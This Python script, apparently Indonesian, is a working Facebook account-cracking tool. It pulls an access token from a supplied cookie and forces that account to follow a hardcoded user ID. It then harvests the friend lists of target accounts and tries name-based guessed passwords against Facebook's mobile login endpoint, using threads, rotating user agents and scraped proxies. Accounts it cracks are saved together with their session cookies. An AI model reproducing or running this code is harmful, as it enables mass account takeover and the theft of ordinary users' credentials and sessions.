                #===========IMPORT MODULE AWAL===========#
                 
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from string import *
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
          #===========GET PROXY===========#
          
try:
	prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('proxy.txt','w').write(prox)
except Exception as e:
	print('Jaringan Internet Anda Bermasalah......')
prox=open('proxy.txt','r').read().splitlines()
###----------[ USER AGENT 2 ]----------###
ugen=[]
for agenku in range(10000):
    rr = random.randint; rc = random.choice
    bek1 = f"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-J710FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek1)
    bek2 = f"Mozilla/5.0 (Linux; Android 11; ZTE Blade A51 Lite RU) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek2)
    bek3 = f"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G901F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek3)
    bek4 = f"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G531H) AppleWebKit/537.36 (KHTML, like Gecko) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek4)
    bek5 = f"Mozilla/5.0 (Linux; Android 8.1.0; A95X MAX) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek5)
    bek6 = f"Mozilla/5.0 (Linux; Android 9; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek6)
    bek7 = f"Mozilla/5.0 (Linux; Android 9; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek7)
    bek8 = f"Mozilla/5.0 (Linux; Android 7.0; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek8)
    bek9 = f"Mozilla/5.0 (Linux; Android 5.0.1; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek9)
    bek10 = f"Mozilla/5.0 (Linux; Android 8.1.0; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek10)
    bek11 = f"Mozilla/5.0 (Linux; Android 9.0; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek11)
    bek12 = f"Mozilla/5.0 (Linux; Android 13; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek12)
    bek13 = f"Mozilla/5.0 (Linux; Android 10; SM-W2021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 EdgA/81.0.416.81"
    ugen.append(bek13)
    bek14 = f"Mozilla/5.0 (Linux; Android 13; SM-A055F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36"
    ugen.append(bek14)
    bek15 = f"Well /5.0 (Linux; Android 5; Samsung Chrome 11 (3180) Build/R103-14816.131.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.464.442 Tokhs/537.36"
    ugen.append(bek15)
    bek16 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-M536B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek16)
    bek17 = f"Mozilla/5.0 (Linux; Android 12; SM-M536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek17)
    bek18 = f"Mozilla/5.0 (Linux; Android 12; moto g41) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek18)
    bek19 = f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J530F/J530FXXS9CUE5) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek19)
    bek20 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-M346B1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek20)
    bek22 = f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(94,119))}.0.0.0 Mobile Safari/537.36'
    ugen.append(bek22)
    bek21 = f"Mozilla/5.0 (Linux; Android 9; SAMSUNG TicWatch Pro 3 Ultra GPS) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek21)
    bek22 = f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J415GN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek22)
    bek23 = f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek23)
    bek24 = f"Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9506) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek24)
    bek25 = f"Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG OW20W2) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek25)
                 #============INDICATION===========#
                 
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,idf,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
ses=requests.Session()
princp=[]
wa = sol()
pwpluss = []
       #===========WARNA COLLOR===========#
       
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])

         #===========PENYIMPANAN===========#
         
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
  
       #===========TAMBAHAN===========#
       
def perjalanan(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	menu()
	
             #===========SEMPEL BANNER===========#
def banner():
	wa.print(f'''[green]

██╗     ██╗   ██╗████████╗██╗  ██╗███████╗██╗
██║     ██║   ██║╚══██╔══╝██║  ██║██╔════╝██║
██║     ██║   ██║   ██║   ███████║█████╗  ██║
██║     ██║   ██║   ██║   ██╔══██║██╔══╝  ██║
███████╗╚██████╔╝   ██║   ██║  ██║██║     ██║
╚══════╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝                                       
[white]Ａｕｔｈｏｒ : [green]L u t h f iＢＦＦ''')
         #===========CEK KUEH & TOKEN LISTRIK===========#
         
def login():
    print(f'{M}◆'* 55)
    print(f'\n{M}>{K}>{H}> {H}Pastikan kamu menggunakan akun tumbal bukan pribadi')
    print(f'{M}◆'* 55)
    cookie = input(f"\n{M}>{K}>{H}> {P}Masukan cookie {H}:{P} ")
    try:convert(cookie);followmy("100022219411831", cookie);exit()
    except Exception as e:exit('\nSepertinya cookies akun tumbal kamu invalid')
    menu()
        
def convert(cookie):
	try:
		link = ses.get("https://www.facebook.com/adsmanager/manage/campaigns", cookies={"cookie": cookie}, allow_redirects=True).text
		link1 = re.search('window\.location\.replace\("(.*?)"\)', str(link)).group(1).replace('\\','')
		link2 = ses.get(link1, cookies={"cookie": cookie}, allow_redirects=True).text
		token = re.search('accessToken="(.*?)"', str(link2)).group(1)
		check_aktif(token, cookie)
	except:pass

def check_aktif(token, cookie):
	try:
		head = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","Accept-Encoding": "gzip, deflate","Accept-Language": "en-US,en;q=0.9","Cache-Control": "max-age=0","Dpr": "1","Pragma": "akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace","Sec-Ch-Prefers-Color-Scheme": "dark","Sec-Ch-Ua": "","Sec-Ch-Ua-Full-Version-List": "","Sec-Ch-Ua-Mobile": "?0","Sec-Ch-Ua-Model": "","Sec-Ch-Ua-Platform": "","Sec-Ch-Ua-Platform-Version": "","Sec-Fetch-Dest": "document","Sec-Fetch-Mode": "navigate","Sec-Fetch-Site": "none","Sec-Fetch-User": "?1","Upgrade-Insecure-Requests": "1","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"}
		link = ses.get("https://www.facebook.com/profile.php", headers=head, cookies={"cookie": cookie}, allow_redirects=True).text
		uid, nama = list(re.findall('"USER_ID":"(.*?)","NAME":"(.*?)"', str(link))[0])
		if uid == 0:
			print(f'\nSepertinya cookies akun tumbal kamu invalid')
			time.sleep(2);exit()
		else:
			open('.tok.txt','w').write(token)
			open('.cok.txt','w').write(cookie)
			print(f"\n{M}>{K}>{H}> {P}Token {M}: {P}"+str(token))
			print(f"\n{M}>{K}>{H}> {P}Login menggunakan cookie berhasil{M}..!!! {K}jalankan ulang script")
	except:pass

def followmy(user, cookie):
	try:
		link = parser(ses.get("https://mbasic.facebook.com/%s"%(user), cookies={"cookie": cookie}).text, "html.parser")
		for foll in link.find_all("a", href=True):
			if "/a/subscribe.php?" in foll.get("href"):
				ses.get("https://mbasic.facebook.com"+foll["href"], cookies={"cookie": cookie}).text
	except:pass

def check_info_facebook(token, cookie):
	try:
		link = ses.get("https://graph.facebook.com/me/?&access_token=%s"%(token), cookies=cookie).json()
		uid  = link["id"]
		nama = link["name"]
		return uid, nama
	except KeyError:
		print(f'{M}◆'* 55)
		os.system("rm -rf .cok.txt")
		os.system("rm -rf .tok.txt")
		print('Maaf, cookie akun tumbal kamu sudah kadaluarsa')
		time.sleep(2);login()
	except requests.exceptions.ConnectionError:
		print(f'{M}◆'* 55)
		exit('Maaf, koneksi internet anda terputus')

                    #===========MENUA BERSAMAMU===========#
def menu():
	clear();banner()
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print(f'\n{P} [%] cookies kamu invalid.{P}')
		os.system("rm -rf .cok.txt")
		os.system("rm -rf .cok.txt")
		time.sleep(2);os.system('clear')
		login()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		uidfb = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\n{P} [%] Tidak ada koneksi{P}")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".tok.txt")
		except:pass
		print(f"\n{P} [%] sepertinya akun tumbal mu terkena checkpoint...{P}");time.sleep(2)
		os.system('clear')
		login()
		print(f'{P}[{M}!{P}] Warning Jangan {M}DiJuall {P}Ya Dek {P}[{M}!{P}]')
	print(f'{P}{P}[{H}•{P}] 1. 𝐌𝐚𝐬𝐬𝐚𝐥   {P}[{H}ON{P}]')
	print(f'{P}{P}[{H}•{P}] 2. 𝐄𝐱𝐢𝐭𝐞𝐝   {P}[{H}ON{P}]')
	mek = input(f' ┗━ 𝙸𝚗𝚙𝚞𝚝 : ')
	if mek in ['1','01']:
		massal()
	else: 
		exit()
 #===========CRACK MASSAL===========#

def massal():
    try:
        token = open('.tok.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
    except IOError:
        print(f'{m}cookies telah kadaluarsa ster')
        exit()
    try:
    	print('')
    	dwi = int(input(f"{P}[{H}?{P}] 𝙹𝚞𝚖𝚕𝚊𝚑 𝙸𝙳 : "))	
    except ValueError:
        exit()
    if dwi < 1 or dwi > 1000:
        exit()
    ses = requests.Session()
    _dwi_ = 0
    for yantti in range(dwi):
        _dwi_ += 1
        Masukan = input(f"{P}[{H}?{P}] 𝙸𝚗𝚙𝚞𝚝 𝙸𝙳 𝚈𝚊𝚗𝚐 𝙺𝚎 {_dwi_}\n ┗━ 𝙸𝚗𝚙𝚞𝚝 𝙸𝙳 : ")
        idf.append(Masukan)
    for user in idf:
        try:
            head = (
                {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
                 })
            if len(id) == 0:
                params = (
                    {
                        'access_token': token,
                        'fields': "friends"
                    }
                )
            else:
                params = (
                    {
                        'access_token': token,
                        'fields': "friends"
                    }
                )
            url = requests.get('https://graph.facebook.com/{}'.format(user),
                               params=params, headers=head, cookies={'cookies': cok}).json()
            for proses in url['friends']['data']:
                try:
                    woy = (proses['id']+'|'+proses['name'])
                    if woy in id:
                        pass
                    else:
                        id.append(woy)
                except:
                    continue
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            exit()
    try:
        #print(f"┗━ 𝙸𝙳 𝚃𝚎𝚛??𝚞𝚖𝚙𝚞𝚕 : " +str(len(id)))
        #print(f'{M}━━'* 25)
        setting()
    except requests.exceptions.ConnectionError:
        print(f" {P}{M}  koneksi terputus")
        exit()
    except (KeyError, IOError):
        print(f" {P}{M}  teman tidak publik")
        exit()
          #===========SETTING===========#
          
def setting():
	for bacot in id:
		xx = random.randint(0,len(id2))
		id2.insert(xx,bacot) 
	passwrd() 
	
          #===========WORDLIST===========#
def passwrd(): 
	print(f'')
	wa.print(f'\r[white]𝚃𝚘𝚝𝚊𝚕 𝙸𝚍𝚜 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 𝙲𝚘𝚕𝚕𝚎𝚌𝚝:[green] '+str(len(id)))
	wa.print(f'\r[white]𝙿𝚕𝚊𝚢 𝙰𝚒𝚛𝚙𝚕𝚊𝚗𝚎 𝙼??𝚍𝚎 𝙴𝚟𝚎𝚛𝚢 500 𝙸𝚍𝚣') 
	print(f'')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append('sayang123')
					pwv.append('bagong')
					pwv.append('memek123')
					pwv.append('bokep123')
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append('sayang123')
					pwv.append('bagong')
					pwv.append('memek123')
					pwv.append('bokep123')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)					
			else:
				pool.submit(crack,idf,pwv)
               #===========METHOD VALIDATE===========#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	rr = random.randint
	rc = random.choice
	sys.stdout.write(f"\r{bo}Running{P}|{P}{loop}|{len(id)}{P}|{H}OK-{ok}{P}|{K}CP-{cp}")
	sys.stdout.flush()
	Sllowly = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9","es-LA,es;q=0.9","es-MX,es;q=0.9"])
	ua = random.choice(ugen) 
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			wibu = ses.get(f'https://free.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&hbl=0&refsrc=deprecated').text
			data = {
					"lsd": re.search('name="lsd" value="(.*?)"',str(wibu)).group(1),
					"jazoest": re.search('name="jazoest" value="(.*?)"', str(wibu)).group(1),
					"uid": idf,
					"next": f"https://free.facebook.com/login/save-device/",
					"flow": "login_no_pin",
					"pass": pw
						}
			wibu_head = {
				'Host': 'm.facebook.com',
				'cache-control': 'max-age=0',
				'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="115", "Google Chrome";v="115"',
				'sec-ch-ua-mobile': '?1',
				'sec-ch-ua-platform': '"Android"',
				'upgrade-insecure-requests': '1',
				'origin': 'https://m.facebook.com',
				'content-type': 'application/x-www-form-urlencoded',
				'user-agent': ua,
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'sec-fetch-site': 'same-origin',
				'x-requested-with': 'com.alohamobile.browser.lite',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-user': '?1',
				'sec-fetch-dest': 'document',
				'referer': f'https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&hbl=0&refsrc=deprecated',
				'accept-encoding': 'gzip, deflate, br',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			}
			post = ses.post(f"https://free.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=wibu_head,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}├──˚ ͟͟͞͞➳ Email  : {H}{idf}{N} | PW  : {H}{pw}{N}\n{P}└──˚ ͟͟͞͞➳  KUKIS : {U}{kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f'\r{P}├──˚ ͟͟͞͞➳ Email  : {K}{idf}{P} | PW : {K}{pw}{P}\n{P}└──˚ ͟͟͞͞➳ User Agent  : {M}{ua}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
            #===========SYSTEM CONTROL===========#
            
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	menu()
